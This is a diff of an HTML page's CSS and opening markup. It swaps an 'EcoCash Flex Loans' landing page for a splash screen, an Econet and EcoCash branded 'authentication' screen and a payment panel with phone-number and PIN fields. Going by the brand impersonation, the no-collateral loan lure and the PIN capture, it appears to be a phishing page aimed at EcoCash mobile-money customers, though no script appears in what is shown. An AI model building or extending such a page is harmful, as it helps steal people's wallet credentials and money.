+.footer-brand-logo{display:flex;align-items:center;gap:10px;text-decoration:none;margin-bottom:16px;cursor:pointer}
+.footer-col h4{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:2px;margin-bottom:16px;color:rgba(255,255,255,.3)}
+.footer-col a{display:block;font-size:13px;color:var(--muted);text-decoration:none;margin-bottom:9px;transition:color var(--tr);font-weight:500;cursor:pointer}
+.footer-col a:hover{color:white}
+.footer-bottom{max-width:1400px;margin:40px auto 0;padding-top:22px;border-top:1px solid rgba(255,255,255,.07);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+.footer-bottom p{font-size:12px;color:rgba(255,255,255,.25)}
+.footer-badge{font-size:11px;color:rgba(255,255,255,.25);display:flex;align-items:center;gap:8px}
+.footer-badge-dot{width:5px;height:5px;background:var(--green);border-radius:50%;flex-shrink:0}
 
-    /* ── WHY SECTION ── */
-    .why-section {
-      padding: 80px 24px;
-      background: var(--surface);
-      border-top: 1px solid var(--border);
-    }
-    .section-inner { max-width: 1120px; margin: 0 auto; }
-    .section-label {
-      font-size: 11px; font-weight: 700; text-transform: uppercase;
-      letter-spacing: 0.16em; color: var(--blue); margin-bottom: 8px;
-    }
-    .section-title {
-      font-family: 'Sora', sans-serif;
-      font-size: clamp(24px, 3.5vw, 38px);
-      font-weight: 800; letter-spacing: -1px; margin-bottom: 10px;
-    }
-    .section-sub {
-      font-size: 15px; color: var(--muted);
-      max-width: 480px; margin-bottom: 48px;
-    }
+/* ═══════════════════════════════════════════
+   CONFIRM MODAL
+═══════════════════════════════════════════ */
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,8,24,.60);z-index:2000;align-items:flex-end;justify-content:center;backdrop-filter:blur(6px)}
+.modal.open{display:flex}
+.modal-box{background:#f0f4f9;width:100%;max-width:600px;border-radius:22px 22px 0 0;overflow:hidden;box-shadow:0 -8px 60px rgba(0,0,0,.35);animation:slideUp .3s cubic-bezier(.22,.8,.3,1) both;max-height:90vh;display:flex;flex-direction:column}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.modal-drag{display:flex;justify-content:center;padding:12px 0 6px;background:#f0f4f9;flex-shrink:0}
+.modal-drag-bar{width:44px;height:5px;background:#ccd4e0;border-radius:3px}
+.modal-head{display:flex;align-items:center;justify-content:space-between;padding:4px 22px 16px;background:#f0f4f9;flex-shrink:0}
+.modal-head h3{font-size:1.2rem;font-weight:800;color:#0a1f4e;margin:0;letter-spacing:-.3px}
+.modal-close-btn{background:rgba(0,0,0,0.07);border:none;color:#5a6a85;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif;transition:var(--tr);flex-shrink:0;font-weight:700}
+.modal-close-btn:hover{background:rgba(0,0,0,0.14)}
+.modal-body{padding:0 16px 20px;overflow-y:auto}
+.modal-section-label{font-size:10px;font-weight:800;color:#8a9bb8;text-transform:uppercase;letter-spacing:1.5px;padding:0 6px;margin-bottom:8px;display:block}
+.modal-rows-card{background:#fff;border-radius:16px;overflow:hidden;border:1px solid rgba(0,30,80,0.08);box-shadow:0 2px 12px rgba(0,30,80,0.06);margin-bottom:14px}
+.modal-row{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid rgba(0,30,80,0.07)}
+.modal-row:last-child{border-bottom:none}
+.modal-row-left{display:flex;align-items:center;gap:10px;font-size:14px;font-weight:500;color:#4a5d80}
+.modal-row-dot{width:7px;height:7px;background:#bcc8de;border-radius:50%;flex-shrink:0}
+.modal-row-val{font-size:14px;font-weight:700;color:#0a1f4e;letter-spacing:-.2px}
+.modal-total-row{background:linear-gradient(135deg,#e8eef8,#dde5f5);border-radius:14px;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;border:1px solid rgba(0,51,160,0.12)}
+.modal-total-label{font-size:14px;font-weight:700;color:#2a3f6e}
+.modal-total-val{font-size:1.5rem;font-weight:900;color:#0033a0;letter-spacing:-.5px}
+.modal-btns{display:flex;gap:12px;margin-top:4px}
+.mbtn{flex:1;padding:16px;border-radius:50px;font-weight:800;cursor:pointer;font-size:14px;font-family:'Inter',sans-serif;transition:var(--tr);min-height:52px;letter-spacing:.1px}
+.mbtn-confirm{background:linear-gradient(135deg,#0033a0,#1a4dbf);color:white;border:none;box-shadow:0 4px 18px rgba(0,51,160,.35)}
+.mbtn-confirm:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,51,160,.45)}
+.mbtn-cancel{background:#fff;color:#5a6a85;border:1.5px solid #d0d9ea}
+.mbtn-cancel:hover{border-color:#9aaac4;color:#0a1f4e}
 
-    .why-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
-    .why-card {
-      border: 1px solid var(--border);
-      border-radius: 16px; padding: 26px;
-      background: var(--bg);
-      transition: box-shadow 0.2s, transform 0.2s;
-    }
-    .why-card:hover {
-      box-shadow: var(--shadow-md);
-      transform: translateY(-3px);
-    }
-    .why-icon {
-      width: 48px; height: 48px; border-radius: 12px;
-      background: var(--blue-tint);
-      display: flex; align-items: center; justify-content: center;
-      font-size: 22px; margin-bottom: 18px;
-      border: 1px solid var(--blue-tint-border);
-    }
-    .why-card h4 {
-      font-family: 'Sora', sans-serif;
-      font-size: 15px; font-weight: 700; margin-bottom: 8px;
-    }
-    .why-card p { font-size: 13.5px; color: var(--muted); line-height: 1.7; }
+/* ═══════════════════════════════════════════
+   PAYMENT PANEL — slides in over the page
+   Same dark navy theme as the rest of the app
+═══════════════════════════════════════════ */
+#paymentPanel{
+  position:fixed;inset:0;z-index:2500;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(4,13,30,0.92);
+  backdrop-filter:blur(10px);
+  opacity:0;visibility:hidden;
+  transition:opacity .35s ease,visibility .35s ease;
+  padding:16px;
+}
+#paymentPanel.open{opacity:1;visibility:visible}
 
-    /* ── HOW IT WORKS ── */
-    .how-section {
-      padding: 80px 24px;
-      background: var(--bg);
-      border-top: 1px solid var(--border);
-    }
-    .steps-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
-    .step-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 16px; padding: 26px;
-      position: relative;
-      transition: box-shadow 0.2s, transform 0.2s;
-    }
-    .step-card:hover { box-shadow: var(--shadow-md); transform: translateY(-3px); }
-    .step-num {
-      width: 38px; height: 38px; border-radius: 50%;
-      background: linear-gradient(135deg, var(--blue-mid), var(--blue-dark));
-      color: #fff;
-      font-family: 'Sora', sans-serif;
-      font-size: 15px; font-weight: 800;
-      display: flex; align-items: center; justify-content: center;
-      margin-bottom: 18px;
-      box-shadow: 0 2px 8px rgba(0,82,204,0.3);
-    }
-    .step-card h4 {
-      font-family: 'Sora', sans-serif;
-      font-size: 15px; font-weight: 700; margin-bottom: 6px;
-    }
-    .step-card p { font-size: 13.5px; color: var(--muted); line-height: 1.7; }
+.pay-card{
+  width:min(100%,480px);
+  background:linear-gradient(180deg,#0c1e3f 0%,#091835 100%);
+  border:1px solid var(--border2);
+  border-radius:28px;
+  box-shadow:0 28px 80px rgba(0,0,0,.7);
+  position:relative;
+  overflow:hidden;
+  max-height:calc(100dvh - 32px);
+  display:flex;
+  flex-direction:column;
+  animation:panelIn .38s cubic-bezier(.22,.8,.3,1) both;
+}
+@keyframes panelIn{from{transform:translateY(32px);opacity:0}to{transform:translateY(0);opacity:1}}
 
-    /* ── FAQ ── */
-    .faq-section {
-      padding: 80px 24px;
-      background: var(--surface);
-      border-top: 1px solid var(--border);
-    }
-    .faq-list { max-width: 640px; margin: 0 auto; display: grid; gap: 8px; }
-    .faq-item {
-      border: 1px solid var(--border);
-      border-radius: 14px; overflow: hidden;
-      background: var(--bg);
-    }
-    .faq-q {
-      padding: 16px 20px;
-      display: flex; align-items: center; justify-content: space-between; gap: 16px;
-      cursor: pointer;
-      font-family: 'Sora', sans-serif;
-      font-size: 14px; font-weight: 600;
-      transition: background 0.15s;
-    }
-    .faq-q:hover { background: var(--blue-tint); }
-    .faq-icon {
-      width: 26px; height: 26px; border-radius: 50%;
-      background: var(--blue-tint); color: var(--blue);
-      font-size: 11px; display: flex; align-items: center; justify-content: center;
-      flex-shrink: 0; transition: 0.2s;
-    }
-    .faq-item.open .faq-icon { transform: rotate(180deg); background: var(--blue); color: #fff; }
-    .faq-ans { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
-    .faq-item.open .faq-ans { max-height: 200px; }
-    .faq-ans-inner {
-      padding: 12px 20px 18px;
-      font-size: 13.5px; color: var(--muted); line-height: 1.7;
-      border-top: 1px solid var(--border);
-    }
+/* top accent bar */
+.pay-card::before{content:'';position:absolute;inset:0 0 auto 0;height:4px;background:linear-gradient(90deg,var(--green),var(--blue-light))}
 
-    /* ── TESTIMONIALS ── */
-    .t-section {
-      padding: 80px 24px;
-      background: #040e1f;
-      border-top: 1px solid #0d2040;
-    }
-    .t-section .section-label { color: rgba(255,255,255,0.35); }
-    .t-section .section-title { color: #fff; }
-    .t-section .section-sub { color: rgba(255,255,255,0.5); }
-    .t-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; }
-    .t-card {
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 16px; padding: 24px;
-      background: rgba(255,255,255,0.04);
-      transition: background 0.2s;
-    }
-    .t-card:hover { background: rgba(255,255,255,0.07); }
-    .t-stars { color: #fbbf24; font-size: 13px; letter-spacing: 2px; margin-bottom: 14px; }
-    .t-text { font-size: 13.5px; color: rgba(255,255,255,0.7); line-height: 1.75; margin-bottom: 16px; }
-    .t-author {
-      font-family: 'Sora', sans-serif;
-      font-size: 13.5px; font-weight: 700; color: #fff;
-    }
-    .t-role { font-size: 11.5px; color: rgba(255,255,255,0.35); margin-top: 2px; }
+.pay-card-inner{overflow-y:auto;padding:clamp(20px,5vw,32px);padding-top:24px}
 
-    /* ── FOOTER ── */
-    footer {
-      background: #020b18;
-      padding: 56px 24px 28px;
-      color: rgba(255,255,255,0.45);
-      border-top: 1px solid rgba(255,255,255,0.06);
-    }
-    .footer-inner { max-width: 1120px; margin: 0 auto; }
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 1.8fr 1fr 1fr 1fr;
-      gap: 40px; margin-bottom: 40px;
-    }
-    .footer-logo-wrap { margin-bottom: 12px; display: flex; align-items: baseline; gap: 0; }
-    .f-eco {
-      font-family: 'Sora', sans-serif;
-      font-size: 22px; font-weight: 800;
-      color: var(--blue); letter-spacing: -0.5px;
-    }
-    .f-cash {
-      font-family: 'Sora', sans-serif;
-      font-size: 22px; font-weight: 800;
-      color: #fca5a5; letter-spacing: -0.5px;
-    }
-    .footer-desc { font-size: 13px; line-height: 1.75; color: rgba(255,255,255,0.42); }
-    .footer-col h5 {
-      font-family: 'Sora', sans-serif;
-      font-size: 10.5px; font-weight: 700;
-      text-transform: uppercase; letter-spacing: 0.14em;
-      color: rgba(255,255,255,0.75); margin-bottom: 14px;
-    }
-    .footer-col a {
-      display: block;
-      font-size: 13px; color: rgba(255,255,255,0.42);
-      margin: 8px 0; transition: color 0.15s;
-    }
-    .footer-col a:not(.disabled):hover { color: rgba(255,255,255,0.8); }
-    .footer-col a.disabled {
-      pointer-events: none; cursor: default;
-      opacity: 0.28;
-    }
-    .footer-bottom {
-      padding-top: 24px;
-      border-top: 1px solid rgba(255,255,255,0.07);
-      display: flex; justify-content: space-between; align-items: center;
-      flex-wrap: wrap; gap: 12px;
-      font-size: 12px;
-    }
-    .footer-live { display: flex; align-items: center; gap: 7px; }
-    .live-dot {
-      width: 7px; height: 7px; border-radius: 50%;
-      background: #4ade80;
-      box-shadow: 0 0 6px rgba(74,222,128,0.6);
-      animation: pulse 2s infinite;
-    }
+/* back button */
+.pay-back{
+  display:inline-flex;align-items:center;gap:7px;
+  background:rgba(255,255,255,0.07);border:1px solid var(--border2);
+  color:var(--text2);font-size:13px;font-weight:700;
+  padding:8px 14px;border-radius:999px;cursor:pointer;
+  font-family:'Inter',sans-serif;transition:var(--tr);
+  margin-bottom:20px;
+}
+.pay-back:hover{background:rgba(255,255,255,0.12);color:#fff}
 
-    /* ── MODAL ── */
-    .overlay {
-      display: none;
-      position: fixed; inset: 0; z-index: 200;
-      background: rgba(4,14,31,0.7);
-      backdrop-filter: blur(8px);
-      padding: 16px;
-      align-items: center; justify-content: center;
-    }
-    .overlay.open { display: flex; }
-    .modal {
-      width: min(100%, 500px);
-      max-height: 90dvh; overflow-y: auto;
-      background: var(--surface);
-      border-radius: 20px;
-      border: 1px solid var(--border);
-      box-shadow: 0 24px 80px rgba(0,0,0,0.25);
-    }
-    .modal-head {
-      background: linear-gradient(135deg, var(--blue-mid) 0%, var(--blue-dark) 100%);
-      padding: 22px 24px;
-      display: flex; align-items: flex-start; justify-content: space-between;
-    }
-    .modal-logo {
-      font-family: 'Sora', sans-serif;
-      font-size: 19px; font-weight: 800; color: #fff;
-    }
-    .modal-logo .mc { color: #fca5a5; }
-    .modal-sub { font-size: 12px; color: rgba(255,255,255,0.6); margin-top: 3px; }
-    .modal-close {
-      width: 32px; height: 32px; border-radius: 50%;
-      border: 1px solid rgba(255,255,255,0.25);
-      background: rgba(255,255,255,0.12);
-      color: #fff; cursor: pointer; font-size: 20px; line-height: 1;
-      display: flex; align-items: center; justify-content: center;
-      transition: background 0.15s; flex-shrink: 0;
-    }
-    .modal-close:hover { background: rgba(255,255,255,0.22); }
+/* logo lockup inside pay panel */
+.pay-logo{text-align:center;margin-bottom:16px}
+.pay-logo-text{font-size:clamp(30px,8vw,40px);font-weight:900;letter-spacing:-1.4px;line-height:1}
+.pay-logo-eco{color:var(--blue-light)}
+.pay-logo-cash{color:#ff3b30}
+.pay-pill{
+  display:inline-flex;align-items:center;gap:6px;
+  margin-top:10px;padding:6px 14px;border-radius:999px;
+  background:var(--blue-soft);border:1px solid var(--blue-bdr);
+  color:var(--text2);font-size:11px;font-weight:800;
+  letter-spacing:0.08em;text-transform:uppercase;white-space:nowrap;
+}
 
-    .modal-body { padding: 24px; }
-    .progress { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 22px; }
-    .prog-seg { height: 4px; border-radius: 99px; background: var(--border); transition: background 0.3s; }
-    .prog-seg.active { background: var(--blue); }
+.pay-title{
+  text-align:center;font-size:clamp(20px,5vw,25px);
+  font-weight:900;letter-spacing:-.7px;margin-bottom:6px;color:var(--text);
+}
+.pay-sub{
+  text-align:center;color:var(--muted);
+  font-size:clamp(12px,3vw,13px);line-height:1.55;margin-bottom:18px;
+  max-width:380px;margin-left:auto;margin-right:auto;
+}
 
-    .loan-sum {
-      display: grid; grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      background: var(--blue-tint);
-      border: 1px solid var(--blue-tint-border);
-      border-radius: 12px; padding: 14px 16px;
-      margin-bottom: 20px;
-    }
-    .ls-lbl { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); }
-    .ls-val {
-      font-family: 'Sora', sans-serif;
-      font-size: 18px; font-weight: 800; margin-top: 4px;
-    }
-    .ls-val.green { color: var(--green); }
+/* bundle recap inside payment panel */
+.pay-bundle-recap{
+  background:linear-gradient(135deg,var(--blue-deep) 0%,#0033a0 100%);
+  border-radius:16px;padding:14px 16px;margin-bottom:20px;
+  border:1px solid rgba(255,255,255,0.12);
+}
+.pay-bundle-recap-title{
+  font-size:10px;font-weight:800;text-transform:uppercase;
+  letter-spacing:0.1em;color:rgba(255,255,255,0.5);margin-bottom:10px;
+}
+.pbr-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.pbr-item{background:rgba(255,255,255,0.08);border-radius:10px;padding:9px 12px}
+.pbr-label{font-size:10px;color:rgba(255,255,255,0.5);font-weight:700;text-transform:uppercase;letter-spacing:.05em}
+.pbr-val{font-size:14px;font-weight:800;color:#fff;margin-top:2px;letter-spacing:-.2px}
+.pbr-total{
+  margin-top:10px;
+  background:rgba(0,176,80,0.15);border:1px solid rgba(0,176,80,0.30);
+  border-radius:10px;padding:10px 12px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.pbr-total-label{font-size:12px;color:rgba(255,255,255,0.65);font-weight:600}
+.pbr-total-val{font-size:1.2rem;font-weight:900;color:#4ade80;letter-spacing:-.4px}
 
-    .fgroup { margin-bottom: 14px; }
-    .flabel {
-      display: block;
-      font-size: 11px; font-weight: 700;
-      text-transform: uppercase; letter-spacing: 0.1em;
-      color: var(--muted); margin-bottom: 6px;
-    }
-    .finput {
-      width: 100%;
-      border: 1.5px solid var(--border);
-      border-radius: 10px; padding: 12px 14px;
-      font-size: 14px; color: var(--text);
-      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
-      background: #fff;
-    }
-    .finput:focus {
-      border-color: var(--blue);
-      box-shadow: 0 0 0 3px rgba(0,82,204,0.1);
-    }
-    .phone-wrap {
-      display: flex; align-items: stretch;
-      border: 1.5px solid var(--border);
-      border-radius: 10px; overflow: hidden;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
-    .phone-wrap:focus-within {
-      border-color: var(--blue);
-      box-shadow: 0 0 0 3px rgba(0,82,204,0.1);
-    }
-    .phone-code {
-      padding: 0 14px; min-height: 46px;
-      background: var(--blue-tint);
-      color: var(--blue); font-size: 13px; font-weight: 700;
-      border-right: 1px solid var(--blue-tint-border);
-      display: flex; align-items: center; white-space: nowrap;
-    }
-    .phone-wrap .finput { border: none; border-radius: 0; box-shadow: none; }
-    .frow { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+/* form elements inside pay panel */
+.pay-form{
+  background:rgba(255,255,255,0.04);border:1px solid var(--border);
+  border-radius:18px;padding:clamp(14px,4vw,18px);
+}
+.pay-field-label{
+  display:block;font-size:11px;font-weight:800;
+  color:rgba(255,255,255,0.55);text-transform:uppercase;
+  letter-spacing:0.07em;margin-bottom:8px;
+}
+.pay-input-group{
+  width:100%;border:1.5px solid rgba(0,176,80,0.4);border-radius:14px;
+  display:flex;align-items:center;padding:13px 14px;
+  background:rgba(255,255,255,0.06);
+  transition:border-color var(--tr);
+}
+.pay-input-group:focus-within{border-color:var(--green)}
+.pay-flag{font-size:22px;margin-right:10px}
+.pay-prefix{color:var(--green);font-weight:800;font-size:15px;margin-right:10px;white-space:nowrap}
+.pay-input{
+  min-width:0;flex:1;border:0;outline:0;
+  font-size:16px;color:#fff;font-family:'Inter',sans-serif;
+  background:transparent;
+}
+.pay-input::placeholder{color:rgba(255,255,255,0.3)}
+.pay-input-pin{letter-spacing:5px}
+.pay-input-pin::placeholder{letter-spacing:0}
+.pay-spacer{height:14px}
+.pay-hint{
+  color:var(--muted);font-size:11.5px;line-height:1.55;
+  margin-top:10px;margin-bottom:16px;
+}
+.pay-error{
+  display:none;background:rgba(228,35,32,0.12);border:1px solid rgba(228,35,32,0.3);
+  color:#fca5a5;font-size:12.5px;font-weight:600;border-radius:12px;
+  padding:10px 13px;margin-bottom:14px;line-height:1.5;
+}
+.pay-btn{
+  width:100%;border:0;border-radius:999px;padding:15px 22px;
+  color:#fff;background:linear-gradient(135deg,var(--green),var(--green-dark));
+  font-size:14px;font-weight:800;letter-spacing:0.05em;text-transform:uppercase;
+  cursor:pointer;box-shadow:0 8px 24px rgba(0,176,80,0.35);
+  font-family:'Inter',sans-serif;
+  transition:opacity .18s,box-shadow .18s,transform .12s;
+}
+.pay-btn:hover:not(:disabled){box-shadow:0 12px 30px rgba(0,176,80,0.45);transform:translateY(-1px)}
+.pay-btn:disabled{background:rgba(255,255,255,0.12);box-shadow:none;cursor:not-allowed}
+.pay-terms{margin-top:14px;color:var(--muted);text-align:center;font-size:11px;line-height:1.5}
+.pay-terms a{color:var(--green);font-weight:700;text-decoration:none}
 
-    .review-box { border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 14px; }
-    .review-row {
-      display: flex; justify-content: space-between; align-items: center;
-      gap: 12px; padding: 11px 16px;
-      border-bottom: 1px solid var(--border);
-    }
-    .review-row:last-child { border-bottom: none; }
-    .review-row:nth-child(odd) { background: var(--bg); }
-    .rr-lbl { font-size: 12px; color: var(--muted); }
-    .rr-val { font-size: 13px; font-weight: 700; text-align: right; }
+/* ═══ SPINNER OVERLAY ═══ */
+#spinnerOverlay{
+  position:fixed;inset:0;display:none;
+  align-items:center;justify-content:center;flex-direction:column;gap:16px;
+  background:rgba(4,13,30,0.92);z-index:4000;backdrop-filter:blur(6px);
+}
+.spinner{width:56px;height:56px;border:5px solid rgba(255,255,255,0.12);border-top-color:var(--green);border-radius:50%;animation:spin .8s linear infinite}
+.spin-label{font-size:15px;font-weight:700;color:#fff;letter-spacing:-.2px}
+.spin-sub{font-size:13px;color:rgba(255,255,255,0.5);margin-top:-8px}
 
-    .success-center { text-align: center; padding: 8px 0 12px; }
-    .success-icon {
-      width: 68px; height: 68px; border-radius: 50%;
-      background: var(--green-bg); color: var(--green);
-      font-size: 32px; display: flex; align-items: center; justify-content: center;
-      margin: 0 auto 16px;
-      box-shadow: 0 0 0 8px rgba(21,128,61,0.08);
-    }
-    .success-center h3 {
-      font-family: 'Sora', sans-serif;
-      font-size: 20px; font-weight: 800; margin-bottom: 8px;
-    }
-    .success-center p {
-      font-size: 13.5px; color: var(--muted); line-height: 1.7;
-      max-width: 340px; margin: 0 auto 20px;
-    }
+/* ═══ AUTH SCREEN ═══ */
+#authScreen{
+  display:none;position:fixed;inset:0;z-index:4500;
+  background:linear-gradient(160deg,#1036b8 0%,#0033a0 40%,#0040c8 100%);
+  flex-direction:column;align-items:center;justify-content:center;gap:0;
+}
+#authScreen.show{display:flex}
+#authScreen::before{content:'';position:absolute;top:15%;left:50%;transform:translateX(-50%);width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,0.07) 0%,transparent 65%);pointer-events:none}
+.auth-logo-wrap{background:white;border-radius:14px;padding:12px 22px;display:flex;align-items:center;gap:0;margin-bottom:48px;box-shadow:0 4px 24px rgba(0,0,0,.25)}
+.auth-econet{display:flex;flex-direction:column;align-items:flex-start;padding-right:18px;border-right:1.5px solid #dde}
+.auth-econet-main{font-size:18px;font-weight:900;letter-spacing:-.5px;background:linear-gradient(90deg,#d10000 0%,#003399 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.auth-econet-sub{font-size:9px;font-weight:600;color:#666;letter-spacing:.5px;margin-top:-2px}
+.auth-ecocash{font-size:20px;font-weight:900;padding-left:18px;background:linear-gradient(90deg,#009900 0%,#00cc33 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:-.3px}
+.auth-spinner{width:46px;height:46px;border-radius:50%;border:3.5px solid rgba(255,255,255,0.20);border-top-color:rgba(255,255,255,0.85);animation:spin .9s linear infinite;margin-bottom:28px}
+.auth-title{font-size:1.3rem;font-weight:800;color:white;letter-spacing:-.3px;margin-bottom:8px}
+.auth-sub{font-size:13px;color:rgba(255,255,255,0.65);font-weight:500;margin-bottom:28px}
+.auth-dots{display:flex;gap:8px;align-items:center}
+.auth-dot{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.35);transition:background .3s}
+.auth-dot.active{background:rgba(255,255,255,0.9)}
+.auth-dot.dash{width:22px;height:10px;border-radius:5px;background:rgba(255,255,255,0.9)}
 
-    .btn-primary {
-      width: 100%;
-      background: linear-gradient(135deg, var(--blue-mid), var(--blue-dark));
-      color: #fff; border: none; border-radius: 10px;
-      padding: 14px 20px;
-      font-family: 'Sora', sans-serif;
-      font-size: 14px; font-weight: 700; cursor: pointer;
-      transition: all 0.2s;
-      box-shadow: 0 3px 12px rgba(0,82,204,0.3);
-    }
-    .btn-primary:hover {
-      background: linear-gradient(135deg, var(--blue-dark), #001f6e);
-      transform: translateY(-1px);
-      box-shadow: 0 6px 18px rgba(0,82,204,0.4);
-    }
-    .btn-ghost {
-      width: 100%; background: #fff; color: #374151;
-      border: 1.5px solid var(--border); border-radius: 10px;
-      padding: 13px 20px;
-      font-family: 'Sora', sans-serif;
-      font-size: 14px; font-weight: 600;
-      cursor: pointer; margin-top: 10px;
-      transition: all 0.2s;
-    }
-    .btn-ghost:hover { border-color: var(--blue); color: var(--blue); background: var(--blue-tint); }
-
-    .verify-msg {
-      display: none; margin-top: 14px;
-      font-size: 13px; color: var(--muted); text-align: center;
-      border: 1px solid var(--border); border-radius: 10px;
-      padding: 14px; background: var(--bg); line-height: 1.65;
-    }
-
-    /* ── RESPONSIVE ── */
-    @media (max-width: 880px) {
-      .why-grid, .steps-row, .t-grid { grid-template-columns: 1fr 1fr; }
-      .footer-grid { grid-template-columns: 1fr 1fr; }
-      .nav-links { display: none; }
-      .hamburger { display: flex; }
-      .result-banner { grid-template-columns: 1fr 1fr; }
-      .result-banner .result-item:last-child { grid-column: 1 / -1; border-top: 1px solid var(--blue-tint-border); padding-top: 14px; }
-      .stat-divider { display: none; }
-    }
-    @media (max-width: 580px) {
-      .why-grid, .steps-row, .t-grid { grid-template-columns: 1fr; }
-      .footer-grid { grid-template-columns: 1fr; }
-      .term-grid { grid-template-columns: repeat(3, 1fr); }
-      .hero-stats { gap: 20px; }
-      .frow, .loan-sum { grid-template-columns: 1fr; }
-      .footer-bottom { flex-direction: column; align-items: flex-start; }
-      .result-banner { grid-template-columns: 1fr; }
-      .result-banner .result-item:last-child { border-top: 1px solid var(--blue-tint-border); padding-top: 14px; }
-      .hero h1 { letter-spacing: -0.5px; }
-    }
-  </style>
+/* ═══ RESPONSIVE ═══ */
+@media(max-width:1024px){
+  .stats-grid{grid-template-columns:repeat(2,1fr)}
+  .stat-item:nth-child(1),.stat-item:nth-child(2){border-bottom:1px solid rgba(255,255,255,.12)}
+  .stat-item:nth-child(2){border-right:none}
+}
+@media(max-width:768px){
+  .nav-links{position:fixed;top:var(--header-h);left:-100%;width:100%;height:calc(100vh - var(--header-h));background:var(--page);flex-direction:column;padding-top:40px;gap:24px;transition:.35s ease;z-index:1200;overflow-y:auto}
+  .nav-links.active{left:0}
+  .nav-links a{font-size:1.05rem;padding:12px 8%;border-bottom:1px solid var(--border)}
+  .hamburger{display:block}
+  .hero{padding-top:56px}
+  .section{padding-top:52px;padding-bottom:52px}
+  .bcard-head{flex-direction:column;gap:12px;text-align:center}
+  .bcard-price-wrap{text-align:center}
+  .price-bar{flex-direction:column;align-items:stretch;text-align:center}
+  .subscribe-btn{width:100%}
+  .period-tabs{flex-wrap:nowrap;overflow-x:auto;justify-content:flex-start;-webkit-overflow-scrolling:touch;scroll-snap-type:x mandatory;padding-bottom:10px;margin:0 -5%;padding-left:5%;padding-right:5%;scrollbar-width:none}
+  .period-tabs::-webkit-scrollbar{display:none}
+  .ptab{scroll-snap-align:start;flex-shrink:0}
+  .summary-card{padding:14px 18px;justify-content:center;text-align:center}
+  .summary-left{flex-direction:column;gap:2px}
+  .summary-metrics{justify-content:center;width:100%}
+  .steps-grid{grid-template-columns:1fr 1fr}
+  .modal-btns{flex-direction:column-reverse}
+  #paymentPanel{padding:0;align-items:flex-end}
+  .pay-card{border-radius:22px 22px 0 0;max-height:92dvh;width:100%;max-width:100%}
+}
+@media(max-width:480px){
+  .stats-grid{grid-template-columns:repeat(2,1fr)}
+  .slider-row{flex-wrap:wrap;gap:8px}
+  .slider-val{min-width:unset}
+  .splash-logos{flex-direction:column;gap:10px}
+  .logo-sub{display:none}
+  .steps-grid{grid-template-columns:1fr}
+}
+@media(max-width:360px){
+  .nav-content{padding:0 4%}
+  .logo-name{font-size:1.3rem}
+  .bcard-price{font-size:2.1rem}
+}
+@media(min-width:640px){
+  .modal{align-items:center}
+  .modal-box{border-radius:22px;max-height:88vh}
+}
+</style>
 </head>
-<body>
+<body class="splash-lock">
+<div class="page-bg"></div>
 
-<!-- NAV -->
-<nav>
-  <div class="nav-inner">
-    <a href="#home">
-      <div class="logo-wrap">
-        <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
-      </div>
-      <span class="logo-tag">Flex Loans</span>
-    </a>
-    <div class="nav-links">
-      <a href="#home">Home</a>
-      <a href="#calculator">Calculator</a>
-      <a href="#how">How It Works</a>
-      <a href="#faq">FAQ</a>
-      <a href="login.html" class="nav-cta">Sign In</a>
-    </div>
-    <button class="hamburger" id="hamburger" onclick="toggleNav()" aria-label="Menu">
-      <span></span><span></span><span></span>
-    </button>
+<!-- ═══ SPLASH ═══ -->
+<div class="splash" id="splash" role="status" aria-live="polite">
+  <div class="splash-logos">
+    <div class="splash-logo econet">econet</div>
+    <span class="splash-plus">+</span>
+    <div class="splash-logo ecocash">EcoCash</div>
   </div>
-  <div class="mobile-menu" id="mobileMenu">
-    <a href="#home" onclick="closeNav()">Home</a>
-    <a href="#calculator" onclick="closeNav()">Calculator</a>
-    <a href="#how" onclick="closeNav()">How It Works</a>
-    <a href="#faq" onclick="closeNav()">FAQ</a>
-    <a href="login.html" onclick="closeNav()">Sign In</a>
-  </div>
-</nav>
+  <div class="splash-spinner"></div>
+  <p>Connecting to EcoCash…</p>
+</div>
 
-<!-- HERO -->
-<section class="hero" id="home">
-  <div class="hero-badge"><span class="pulse"></span> Zimbabwe EcoCash Customers</div>
-  <h1>Empower Your Goals<br>with <span class="h1-red">EcoCash</span> Flex Loans</h1>
-  <p>Get the funds you need fast, directly through your EcoCash wallet. No collateral required — just fair rates and flexible terms.</p>
-  <div class="hero-stats">
-    <div>
-      <div class="hero-stat-val">15 min</div>
-      <div class="hero-stat-lbl">Approval Time</div>
-    </div>
-    <div class="stat-divider"></div>
-    <div>
-      <div class="hero-stat-val">ZiG 50K</div>
-      <div class="hero-stat-lbl">Max Amount</div>
-    </div>
-    <div class="stat-divider"></div>
